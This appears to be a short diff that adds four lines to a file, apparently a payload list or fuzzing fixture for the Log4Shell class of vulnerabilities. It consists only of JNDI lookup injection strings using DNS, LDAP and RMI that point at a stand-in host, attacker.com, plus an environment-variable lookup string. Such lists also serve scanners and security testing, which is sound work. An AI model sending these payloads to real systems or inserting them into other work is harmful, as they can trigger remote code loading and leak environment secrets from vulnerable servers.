@@ -1,0 +1,4 @@
+${${env:ENV_NAME}}
+${jndi:dns://attacker.com/a}
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
